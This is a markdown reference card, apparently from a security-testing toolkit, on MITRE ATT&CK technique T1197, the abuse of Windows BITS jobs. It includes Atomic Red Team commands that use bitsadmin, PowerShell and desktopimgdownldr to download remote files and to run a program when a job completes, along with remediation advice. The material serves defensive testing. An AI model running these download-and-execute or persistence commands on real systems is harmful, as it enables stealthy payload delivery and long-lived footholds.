---
name: "T1197_bits-jobs"
description: "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1197
  - defense-evasion
  - persistence
  - windows
technique_id: "T1197"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - persistence
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1197"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with: []
prerequisites: []
severity_boost: {}
---

# T1197 BITS Jobs

## High-Level Description

Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.

Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).

BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Persistence (TA0003)

**Platforms:** Windows

## What to Check

- [ ] Identify if BITS Jobs technique is applicable to target environment
- [ ] Check Windows systems for indicators of BITS Jobs
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Bitsadmin Download (cmd)

This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload

**Supported Platforms:** windows

```cmd
bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
```

### Atomic Test 2: Bitsadmin Download (PowerShell)

This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload leveraging PowerShell

Upon execution you will find a github markdown file downloaded to the Temp directory

**Supported Platforms:** windows

```powershell
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
```

### Atomic Test 3: Persist, Download, & Execute

This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.

**Supported Platforms:** windows

```cmd
bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
bitsadmin.exe /resume #{bits_job_name}
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete #{bits_job_name}
```

### Atomic Test 4: Bits download using desktopimgdownldr.exe (cmd)

This test simulates using desktopimgdownldr.exe to download a malicious file
instead of a desktop or lockscreen background img. The process that actually makes
the TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”)
and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/

**Supported Platforms:** windows

```cmd
set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to BITS Jobs by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1197 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1018 User Account Management

Consider limiting access to the BITS interface to specific users or groups.

### M1037 Filter Network Traffic

Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic.

### M1028 Operating System Configuration

Consider reducing the default BITS job lifetime in Group Policy or by editing the <code>JobInactivityTimeout</code> and <code>MaxDownloadTime</code> Registry values in <code> HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS</code>.

## Detection

### Detect abuse of Windows BITS Jobs for download, execution and persistence

## Risk Assessment

| Finding                        | Severity | Impact          |
| ------------------------------ | -------- | --------------- |
| BITS Jobs technique applicable | Low      | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [CTU BITS Malware June 2016](https://www.secureworks.com/blog/malware-lingers-with-bits)
- [Symantec BITS May 2007](https://www.symantec.com/connect/blogs/malware-update-windows-update)
- [Elastic - Hunting for Persistence Part 1](https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1)
- [PaloAlto UBoatRAT Nov 2017](https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/)
- [Microsoft Issues with BITS July 2011](https://technet.microsoft.com/library/dd939934.aspx)
- [Microsoft BITS](https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx)
- [Microsoft BITSAdmin](https://msdn.microsoft.com/library/aa362813.aspx)
- [Microsoft COM](https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx)
- [Mondok Windows PiggyBack BITS May 2007](https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/)
- [Atomic Red Team - T1197](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1197)
- [MITRE ATT&CK - T1197](https://attack.mitre.org/techniques/T1197)
